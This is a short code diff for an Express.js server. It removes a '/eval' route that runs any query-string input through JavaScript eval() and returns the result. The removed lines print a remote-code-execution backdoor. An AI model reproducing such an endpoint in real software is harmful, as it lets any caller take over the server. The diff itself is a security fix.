@@ -127,9 +127,3 @@ app.get("/api/build/:buildNumber/sbom", async (req, res) => {
 app.listen(3000, () => {
     console.log("Server running on port 3000");
 });
-
-app.get('/eval', (req, res) => {
-    const input = req.query.input;
-    const result = eval(input);
-    res.send(result.toString());
-});
